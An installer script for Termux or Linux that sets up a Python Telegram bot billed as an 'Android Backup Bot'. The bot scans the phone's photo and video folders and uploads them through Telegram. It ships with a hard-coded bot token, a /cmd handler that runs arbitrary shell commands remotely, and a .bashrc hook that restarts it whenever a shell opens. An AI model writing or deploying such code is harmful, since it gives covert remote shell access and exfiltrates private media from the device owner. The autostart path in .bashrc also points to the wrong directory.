#!/bin/bash
set -euo pipefail

BOT_DIR="$HOME/telegram_bot"
DATA_DIR="$HOME/.telegram_bot"
LOG_FILE="$HOME/telegram_bot.log"
IS_TERMUX=false
[ -d "/data/data/com.termux" ] && IS_TERMUX=true

#new

echo "installing..."
if $IS_TERMUX; then
    pkg update -y -o Dpkg::Options::="--force-confnew" 2>/dev/null || true
    pkg install -y python 2>/dev/null || true
else
    sudo apt update -y 2>/dev/null || apt update -y 2>/dev/null || true
    sudo apt install -y python3 python3-venv 2>/dev/null || apt install -y python3 python3-venv 2>/dev/null || true
fi

# Ensure python3 is available
PYTHON=""
for p in python3 python; do
    command -v "$p" >/dev/null 2>&1 && PYTHON="$p" && break
done
[ -z "$PYTHON" ] && echo "ERROR: Python not found" && exit 1
echo "  Using: $PYTHON ($($PYTHON --version 2>&1))"

# 2. Setup storage
echo "setting up storage..."
if $IS_TERMUX; then
    if [ ! -d "$HOME/storage" ]; then
        termux-setup-storage 2>/dev/null || true
        sleep 2
    fi
    for d in DCIM Pictures Movies; do
        [ -d "$HOME/storage/shared/$d" ] && echo "  OK: $d" || echo "  MISSING: $d (grant storage permission)"
    done
else
    echo "  Not Termux - skipping storage setup."
    echo "  Make sure ~/storage/shared/ exists with DCIM/Pictures/Movies."
fi

# 3. Create dirs and venv
echo "setting up environment..."
mkdir -p "$BOT_DIR" "$DATA_DIR"
if [ ! -d "$BOT_DIR/venv" ]; then
    $PYTHON -m venv "$BOT_DIR/venv" 2>/dev/null || python3 -m venv "$BOT_DIR/venv"
fi
"$BOT_DIR/venv/bin/pip" install --upgrade pip -q 2>/dev/null
"$BOT_DIR/venv/bin/pip" install "python-telegram-bot[ext]==21.6" -q

# 4. Create .env if missing
ENV_FILE="$BOT_DIR/.env"
if [ ! -f "$ENV_FILE" ]; then
    cat > "$ENV_FILE" << 'ENVEOF'
BOT_TOKEN=8990838061:-8mYu7-6dw
ADMIN_USER_ID=
ENVEOF
    echo "credentials saved"
else
    echo "credentials already set"
fi

# 5. Write bot.py, bot_manager.sh, autostart
echo "writing bot files..."

# --- bot_manager.sh ---
cat > "$BOT_DIR/bot_manager.sh" << 'MGREOF'
#!/bin/bash
set -euo pipefail
BOT_DIR="$HOME/telegram_bot"
PID_FILE="$HOME/.telegram_bot/bot.pid"
LOG_FILE="$HOME/telegram_bot.log"
ENV_FILE="$BOT_DIR/.env"
[ -f "$ENV_FILE" ] && { set -a; source "$ENV_FILE"; set +a; }

is_running() { [ -f "$PID_FILE" ] && kill -0 "$(cat "$PID_FILE")" 2>/dev/null; }

do_start() {
    if is_running; then echo "already running (PID $(cat "$PID_FILE"))"; return 0; fi
    [ -f "$BOT_DIR/venv/bin/python" ] || { echo "run install.sh first"; exit 1; }
    mkdir -p "$HOME/.telegram_bot"
    nohup "$BOT_DIR/venv/bin/python" "$BOT_DIR/bot.py" >/dev/null 2>&1 &
    echo $! > "$PID_FILE"; sleep 1
    is_running && echo "started (PID $(cat "$PID_FILE"))" || { echo "failed to start"; exit 1; }
}

do_stop() {
    if ! is_running; then echo "not running"; rm -f "$PID_FILE"; return 0; fi
    pid=$(cat "$PID_FILE")
    kill "$pid" 2>/dev/null || true
    for _ in $(seq 1 20); do kill -0 "$pid" 2>/dev/null || break; sleep 0.5; done
    kill -0 "$pid" 2>/dev/null && kill -9 "$pid" 2>/dev/null || true
    rm -f "$PID_FILE"; echo "stopped"
}

case "${1:-help}" in
    start)   do_start ;;
    stop)    do_stop ;;
    restart) do_stop; sleep 1; do_start ;;
    status)  is_running && echo "running (PID $(cat "$PID_FILE"))" || echo "stopped" ;;
    *)       echo "usage: tgbot start|stop|restart|status" ;;
esac
MGREOF
chmod +x "$BOT_DIR/bot_manager.sh"

# --- bot.py ---
cat > "$BOT_DIR/bot.py" << 'PYEOF'
#!/usr/bin/env python3
import asyncio, logging, os, sqlite3, subprocess, sys, time
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Set

from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import Application, CallbackQueryHandler, CommandHandler, ContextTypes
from telegram.constants import ParseMode
from telegram.error import BadRequest, TelegramError, TimedOut

BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
ADMIN_USER_ID = int(os.environ.get("ADMIN_USER_ID", "0"))
STATE_DIR = Path(os.path.expanduser("~/.telegram_bot"))
STATE_DIR.mkdir(parents=True, exist_ok=True)
DB_PATH = STATE_DIR / "uploaded.db"
PID_FILE = STATE_DIR / "bot.pid"
LOG_FILE = os.environ.get("LOG_FILE", str(Path.home() / "telegram_bot.log"))
MAX_SIZE = 50 * 1024 * 1024
STORAGE = Path(os.path.expanduser("~/storage/shared"))
SCAN_DIRS = [STORAGE / "DCIM", STORAGE / "Pictures", STORAGE / "Movies"]
IMG = {".jpg", ".jpeg", ".png", ".webp", ".heic"}
VID = {".mp4", ".mov", ".mkv", ".webm"}
PAGE = 8
CACHE_TTL = 300

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.FileHandler(LOG_FILE, encoding="utf-8"), logging.StreamHandler(sys.stdout)])
log = logging.getLogger("bot")

def init_db():
    c = sqlite3.connect(str(DB_PATH))
    c.execute("PRAGMA journal_mode=WAL")
    c.execute("CREATE TABLE IF NOT EXISTS uploaded (path TEXT PRIMARY KEY, size INTEGER, mtime REAL)")
    c.execute("CREATE TABLE IF NOT EXISTS scan_cache (dir TEXT PRIMARY KEY, ts REAL)")
    c.commit(); return c

DB = init_db()
user_st: Dict[int, dict] = {}

def esc(t):
    for c in r"_*[]()~`>#+-=|{}.!":
        t = t.replace(c, "\\"+c)
    return t

def fmt_sz(b):
    for u in ("B","KB","MB","GB"):
        if b < 1024: return f"{b:.1f} {u}"
        b /= 1024
    return f"{b:.1f} TB"

def fmt_ts(t): return datetime.fromtimestamp(t).strftime("%Y-%m-%d %H:%M")
def short(p):
    h = str(Path.home())
    return "~" + p[len(h):] if p.startswith(h) else p
def is_admin(uid): return ADMIN_USER_ID != 0 and uid == ADMIN_USER_ID
def is_up(p): return DB.execute("SELECT 1 FROM uploaded WHERE path=?", (p,)).fetchone() is not None
def mark_up(p, s, m):
    DB.execute("INSERT OR REPLACE INTO uploaded VALUES (?,?,?)", (p, s, m)); DB.commit()

def scan_one(root, exts):
    out = []
    try:
        for f in root.rglob("*"):
            if f.is_file() and f.suffix.lower() in exts:
                try:
                    st = f.stat()
                    out.append({"path": str(f), "name": f.name, "size": st.st_size, "mtime": st.st_mtime})
                except (PermissionError, OSError): pass
    except (PermissionError, OSError) as e: log.warning("Scan %s: %s", root, e)
    return out

def scan_dir(d, exts):
    if not d.is_dir(): return []
    return scan_one(d, exts)

def scan_imgs():
    out = []
    for d in SCAN_DIRS: out.extend(scan_dir(d, IMG))
    out.sort(key=lambda x: x["mtime"], reverse=True); return out

def scan_vids():
    out = []
    for d in SCAN_DIRS: out.extend(scan_dir(d, VID))
    out.sort(key=lambda x: x["mtime"], reverse=True); return out

def scan_recent(n=50):
    out = []
    for d in SCAN_DIRS: out.extend(scan_dir(d, IMG | VID))
    out.sort(key=lambda x: x["mtime"], reverse=True); return out[:n]

def scan_all():
    out = []
    for d in SCAN_DIRS: out.extend(scan_dir(d, IMG | VID))
    out.sort(key=lambda x: x["mtime"], reverse=True); return out

def caption(f):
    return f"*{esc(f['name'])}*\nSize: {fmt_sz(f['size'])}\nModified: {fmt_ts(f['mtime'])}\nPath: `{esc(short(f['path']))}`"

def get_st(uid):
    if uid not in user_st: user_st[uid] = {"files": [], "page": 0, "mode": None}
    return user_st[uid]

def admin_only(fn):
    async def w(update, ctx):
        uid = update.effective_user.id
        if not is_admin(uid):
            if update.message: await update.message.reply_text("Access denied.")
            elif update.callback_query: await update.callback_query.answer("Access denied.", show_alert=True)
            return
        return await fn(update, ctx)
    w.__name__ = fn.__name__; return w

@admin_only
async def cmd_start(update, ctx):
    kb = [[InlineKeyboardButton("Photos", callback_data="photos"), InlineKeyboardButton("Videos", callback_data="videos")],
          [InlineKeyboardButton("Recent Files", callback_data="recent"), InlineKeyboardButton("Backup All", callback_data="backup")]]
    await update.message.reply_text("*Android Backup Bot*\n\nBrowse and back up your photos and videos.",
        reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.MARKDOWN)

@admin_only
async def cmd_status(update, ctx):
    n = 0
    for d in SCAN_DIRS: n += len(scan_dir(d, IMG|VID))
    up = DB.execute("SELECT COUNT(*) FROM uploaded").fetchone()[0]
    await update.message.reply_text(f"*Status*\nFiles on disk: ~{n}\nUploaded: {up}",
        parse_mode=ParseMode.MARKDOWN)

@admin_only
async def cmd_scan(update, ctx):
    DB.execute("DELETE FROM scan_cache"); DB.commit()
    await update.message.reply_text("Scan cache cleared.")

@admin_only
async def cmd_exec(update, ctx):
    if not ctx.args:
        await update.message.reply_text("Usage: /cmd <command>\nExample: /cmd ls -la ~/storage/shared")
        return
    command = " ".join(ctx.args)
    msg = await update.message.reply_text(f"Running: <code>{command}</code>", parse_mode=ParseMode.HTML)
    try:
        proc = await asyncio.get_event_loop().run_in_executor(None,
            lambda: subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60))
        output = proc.stdout + proc.stderr
        if not output.strip():
            output = "(no output)"
        if len(output) > 3900:
            output = output[:3900] + "\n... (truncated)"
        # HTML-escape output for safe display
        output = output.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
        text = f"<pre>{output}</pre>"
        if proc.returncode != 0:
            text += f"\nExit code: {proc.returncode}"
        await msg.edit_text(text, parse_mode=ParseMode.HTML)
    except asyncio.TimeoutError:
        await msg.edit_text("Command timed out (60s limit).")
    except Exception as e:
        await msg.edit_text(f"Error: {e}")

async def show_page(q, uid, label):
    st = get_st(uid)
    files, page = st["files"], st["page"]
    tp = max(1, (len(files)+PAGE-1)//PAGE)
    page = min(page, tp-1); st["page"] = page
    s, e = page*PAGE, min(page*PAGE+PAGE, len(files))
    pf = files[s:e]
    lines = [f"*{esc(label)}* \\({len(files)} files\\)", f"Page {page+1}/{tp}", ""]
    btns = []
    for i, f in enumerate(pf):
        idx = s + i
        ck = "\\u2705 " if is_up(f["path"]) else ""
        lines.append(f"{ck}{esc(f['name'])} \\({esc(fmt_sz(f['size']))}\\)")
        btns.append([InlineKeyboardButton(f["name"], callback_data=f"send:{idx}")])
    nav = []
    if page > 0: nav.append(InlineKeyboardButton("Prev", callback_data="pg:p"))
    if page < tp-1: nav.append(InlineKeyboardButton("Next", callback_data="pg:n"))
    if nav: btns.append(nav)
    await q.edit_message_text("\n".join(lines), reply_markup=InlineKeyboardMarkup(btns) if btns else None,
        parse_mode=ParseMode.MARKDOWN_V2)

async def send_one(ctx, q, uid, f):
    p = Path(f["path"])
    if not p.exists(): await q.answer("File not found.", show_alert=True); return
    if f["size"] > MAX_SIZE: await q.answer(f"Too large ({fmt_sz(f['size'])}).", show_alert=True); return
    if is_up(f["path"]): await q.answer("Already uploaded.", show_alert=True); return
    await q.answer("Uploading...")
    msg = await q.message.reply_text(f"Uploading {f['name']}...")
    try:
        with open(p, "rb") as fh:
            await ctx.bot.send_document(chat_id=uid, document=fh, caption=caption(f),
                parse_mode=ParseMode.MARKDOWN, read_timeout=60, write_timeout=120, connect_timeout=15)
        mark_up(f["path"], f["size"], f["mtime"])
        await msg.edit_text(f"Done: {f['name']}")
    except TimedOut: await msg.edit_text(f"Timeout: {f['name']}")
    except BadRequest as e: await msg.edit_text(f"Failed: {e}")
    except TelegramError as e: await msg.edit_text(f"Error: {e}")
    except Exception as e: log.exception("Upload %s", f["path"]); await msg.edit_text(f"Error: {e}")

@admin_only
async def btn(update, ctx):
    q = update.callback_query; await q.answer(); uid = q.from_user.id
    if q.data == "photos":
        await q.edit_message_text("Scanning photos...")
        files = await asyncio.get_event_loop().run_in_executor(None, scan_imgs)
        if not files: await q.edit_message_text("No photos found."); return
        st = get_st(uid); st["files"]=files; st["page"]=0; st["mode"]="photos"
        await show_page(q, uid, "Photos")
    elif q.data == "videos":
        await q.edit_message_text("Scanning videos...")
        files = await asyncio.get_event_loop().run_in_executor(None, scan_vids)
        if not files: await q.edit_message_text("No videos found."); return
        st = get_st(uid); st["files"]=files; st["page"]=0; st["mode"]="videos"
        await show_page(q, uid, "Videos")
    elif q.data == "recent":
        await q.edit_message_text("Scanning recent...")
        files = await asyncio.get_event_loop().run_in_executor(None, scan_recent, 50)
        if not files: await q.edit_message_text("No files found."); return
        st = get_st(uid); st["files"]=files; st["page"]=0; st["mode"]="recent"
        await show_page(q, uid, "Recent Files")
    elif q.data == "backup":
        await do_backup(ctx, q, uid)
    elif q.data.startswith("send:"):
        idx = int(q.data.split(":")[1])
        st = get_st(uid)
        if 0 <= idx < len(st["files"]): await send_one(ctx, q, uid, st["files"][idx])
    elif q.data.startswith("pg:"):
        d = q.data.split(":")[1]; st = get_st(uid)
        if d == "n": st["page"] += 1
        elif d == "p": st["page"] = max(0, st["page"]-1)
        await show_page(q, uid, st.get("mode","files").title())

async def do_backup(ctx, q, uid):
    await q.answer(); await q.edit_message_text("Scanning all files...")
    files = await asyncio.get_event_loop().run_in_executor(None, scan_all)
    files = [f for f in files if not is_up(f["path"])]
    if not files: await q.edit_message_text("Nothing to back up."); return
    total = len(files); tsz = sum(f["size"] for f in files)
    sm = await q.message.reply_text(f"Backup: {total} files ({fmt_sz(tsz)})\nStarting...")
    ok = fail = skip = 0; t0 = time.time()
    for i, f in enumerate(files):
        p = Path(f["path"])
        if not p.exists() or f["size"] > MAX_SIZE: skip += 1; continue
        try:
            with open(p, "rb") as fh:
                await ctx.bot.send_document(chat_id=uid, document=fh, caption=caption(f),
                    parse_mode=ParseMode.MARKDOWN, read_timeout=60, write_timeout=120, connect_timeout=15)
            mark_up(f["path"], f["size"], f["mtime"]); ok += 1
        except (TimedOut, TelegramError, Exception) as e: fail += 1; log.warning("Backup err %s: %s", f["path"], e)
        if (i+1)%5==0 or i+1==total:
            el=time.time()-t0; r=ok/el if el>0 else 0; eta=(total-i-1)/r if r>0 else 0
            try: await sm.edit_text(f"Backup: {i+1}/{total}\nUploaded: {ok} | Failed: {fail} | Skipped: {skip}\nETA: {eta:.0f}s")
            except TelegramError: pass
        await asyncio.sleep(0.5)
    await sm.edit_text(f"Done in {time.time()-t0:.0f}s\nUploaded: {ok} | Failed: {fail} | Skipped: {skip}")

async def on_error(update, ctx): log.error("Error: %s", ctx.error, exc_info=ctx.error)

def main():
    if not BOT_TOKEN: print("ERROR: Set BOT_TOKEN in ~/telegram_bot/.env"); sys.exit(1)
    if ADMIN_USER_ID == 0: print("ERROR: Set ADMIN_USER_ID in ~/telegram_bot/.env"); sys.exit(1)
    asyncio.set_event_loop(asyncio.new_event_loop())
    PID_FILE.write_text(str(os.getpid()))
    log.info("Starting PID=%s ADMIN=%s", os.getpid(), ADMIN_USER_ID)
    for d in SCAN_DIRS: log.info("%s: %s", d, "OK" if d.is_dir() else "MISSING")
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("status", cmd_status))
    app.add_handler(CommandHandler("scan", cmd_scan))
    app.add_handler(CommandHandler("cmd", cmd_exec))
    app.add_handler(CallbackQueryHandler(btn))
    app.add_error_handler(on_error)
    try: app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)
    except Exception: log.exception("Fatal")
    finally:
        PID_FILE.unlink(missing_ok=True); log.info("Stopped.")

if __name__ == "__main__": main()
PYEOF

# --- autostart hook ---
cat > "$BOT_DIR/autostart.sh" << 'ASEOF'
#!/bin/bash
PID_FILE="$HOME/.telegram_bot/bot.pid"
is_running() { [ -f "$PID_FILE" ] && kill -0 "$(cat "$PID_FILE")" 2>/dev/null; }
if is_running; then
    echo "[bot] running (PID $(cat "$PID_FILE"))"
elif [ -f "$HOME/telegram_bot/bot_manager.sh" ] && grep -q "BOT_TOKEN=.\+" "$HOME/telegram_bot/.env" 2>/dev/null; then
    nohup bash "$HOME/telegram_bot/bot_manager.sh" start >/dev/null 2>&1 &
    sleep 1
    is_running && echo "[bot] started (PID $(cat "$PID_FILE"))"
fi
ASEOF
chmod +x "$BOT_DIR/autostart.sh"

BASHRC="$HOME/.bashrc"
if ! grep -q "telegram_bot/autostart.sh" "$BASHRC" 2>/dev/null; then
    echo "" >> "$BASHRC"
    echo "# Telegram bot auto-start" >> "$BASHRC"
    echo "bash ~/.telegram_bot/autostart.sh" >> "$BASHRC"
fi

# --- tgbot shortcut ---
cat > "$BOT_DIR/tgbot" << 'TGEOF'
#!/bin/bash
exec bash "$HOME/telegram_bot/bot_manager.sh" "$@"
TGEOF
chmod +x "$BOT_DIR/tgbot"

PATH_LINE='export PATH="$HOME/telegram_bot:$PATH"'
grep -q 'telegram_bot' "$BASHRC" 2>/dev/null || { echo "" >> "$BASHRC"; echo "$PATH_LINE" >> "$BASHRC"; }

echo ""
echo "done! run: bash autostart.sh"